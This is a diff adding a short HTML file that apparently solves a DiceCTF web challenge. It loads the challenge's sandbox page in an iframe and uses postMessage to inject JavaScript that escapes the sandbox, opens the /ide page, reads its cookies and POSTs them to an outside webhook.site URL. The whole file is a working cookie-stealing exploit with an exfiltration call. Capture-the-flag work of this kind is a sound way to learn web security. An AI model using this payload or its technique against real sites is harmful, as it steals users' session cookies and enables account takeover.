@@ -1,0 +1,13 @@
+<body>
+  <iframe src="https://web-ide.dicec.tf/sandbox.html" sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox"></iframe>
+  <script>
+    const frame = document.querySelector('iframe');
+    frame.onload = () => frame.contentWindow.postMessage(`(async () => {
+      const w = eval.call(this, "window");
+      let p = w.open('/ide');
+      await new w.Promise(r => w.setTimeout(r, 500));
+      const c = p.document.cookie;
+      w.fetch("https://webhook.site/8ee5457c-df16-4b08-9dbc-b72af16bc1a2", { method: "POST", body: c });
+    })();`, '*');
+  </script>
+</body>
